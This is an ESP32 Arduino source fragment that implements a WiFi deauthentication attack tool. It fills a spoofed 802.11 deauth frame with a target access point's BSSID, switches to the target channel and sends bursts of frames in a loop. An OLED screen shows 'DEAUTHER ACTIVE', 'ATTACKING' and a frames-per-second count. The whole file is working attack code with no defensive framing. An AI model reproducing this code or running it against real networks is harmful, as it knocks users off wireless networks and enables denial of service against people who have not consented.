#include <WiFi.h>
#include <esp_wifi.h>

// 26-byte deauth frame template
const uint8_t deauth_template[] = {
  0xc0, 0x00, 0x3a, 0x01, 
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination MAC (Broadcast)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source MAC (AP BSSID - placeholder)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID MAC (AP BSSID - placeholder)
  0xf0, 0xff, 
  0x07, 0x00                          // Reason code: Class 3 frame received from nonassociated STA (0x0007)
};

void parseMacAddress(String macStr, uint8_t* mac) {
  int values[6];
  if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x", 
             &values[0], &values[1], &values[2], 
             &values[3], &values[4], &values[5]) == 6) {
    for (int i = 0; i < 6; ++i) {
      mac[i] = (uint8_t)values[i];
    }
  } else {
    memset(mac, 0, 6);
  }
}

void deautherAttackLoop() {
  if (!deauthActive) {
    deauthActive = true;
    deauthFrameCount = 0;
    deauthFrameCounterThisSecond = 0;
    deauthFps = 0;
    lastDeauthSendTime = millis();
    lastFpsUpdateTime = millis();
    
    // Parse MAC
    parseMacAddress(deauthTargetMACStr, deauthTargetMAC);
    
    // Set WiFi mode to APSTA
    WiFi.mode(WIFI_AP_STA);
    delay(50);
    esp_wifi_start();
    delay(50);
    esp_wifi_set_channel(deauthTargetChannel, WIFI_SECOND_CHAN_NONE);
    delay(50);
    
    // Set LED Pin to Red (indicator)
    setColor(255, 0, 0);
  }
  
  // Build deauth frame
  uint8_t frame[26];
  memcpy(frame, deauth_template, 26);
  memcpy(&frame[10], deauthTargetMAC, 6); // Source MAC
  memcpy(&frame[16], deauthTargetMAC, 6); // BSSID
  
  // Send packets
  for (int i = 0; i < 5; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, false);
    deauthFrameCount++;
    deauthFrameCounterThisSecond++;
    delay(2);
  }
  
  // Update FPS counter every second
  unsigned long now = millis();
  if (now - lastFpsUpdateTime >= 1000) {
    deauthFps = deauthFrameCounterThisSecond;
    deauthFrameCounterThisSecond = 0;
    lastFpsUpdateTime = now;
  }
  
  // Render UI
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.drawFrame(0, 0, 128, 14);
  u8g2.drawStr(4, 10, "DEAUTHER ACTIVE");
  
  u8g2.setFont(u8g2_font_5x8_tr);
  u8g2.drawStr(4, 22, ("SSID: " + deauthTargetSSID).c_str());
  u8g2.drawStr(4, 32, ("BSSID:" + deauthTargetMACStr).c_str());
  u8g2.drawStr(4, 42, ("Chan: " + String(deauthTargetChannel)).c_str());
  
  // Dynamic dots animation for "ATTACKING"
  static int animState = 0;
  static unsigned long lastAnimTime = 0;
  if (now - lastAnimTime > 250) {
    animState = (animState + 1) % 4;
    lastAnimTime = now;
  }
  String animStr = "ATTACKING";
  for (int i = 0; i < animState; i++) {
    animStr += ".";
  }
  u8g2.drawStr(4, 52, animStr.c_str());
  
  u8g2.drawStr(4, 62, ("Sent: " + String(deauthFrameCount) + " (" + String(deauthFps) + "/s)").c_str());
  u8g2.sendBuffer();
}

